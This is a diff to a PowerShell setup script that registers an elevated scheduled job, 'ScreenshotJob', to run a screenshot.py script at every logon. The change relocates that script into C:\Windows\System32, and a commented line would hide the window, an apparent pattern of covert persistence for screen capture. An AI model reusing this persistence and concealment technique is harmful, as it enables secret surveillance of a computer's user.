@@ -20,6 +20,6 @@ Register-ScheduledJob -Name "ScreenshotJob" -ScriptBlock {python.exe 'C:\Program
 # Final
 Start-Process powershell.exe -Verb runAs -ArgumentList '-noprofile -noexit -command "Set-ExecutionPolicy RemoteSigned"'
 $Settings = New-ScheduledJobOption -RunElevated -DoNotAllowDemandStart
-$Job = Register-ScheduledJob -Name "ScreenshotJob" -ScriptBlock { python.exe screenshot.py } -Trigger (New-JobTrigger -AtLogon -RandomDelay 00:00:15) -ScheduledJobOption $Settings
+$Job = Register-ScheduledJob -Name "ScreenshotJob" -ScriptBlock { python 'C:\Windows\System32\screenshot.py' } -Trigger (New-JobTrigger -AtLogon -RandomDelay 00:00:15) -ScheduledJobOption $Settings
 
 # $Job | Set-ScheduledJobOption -WindowStyle Hidden
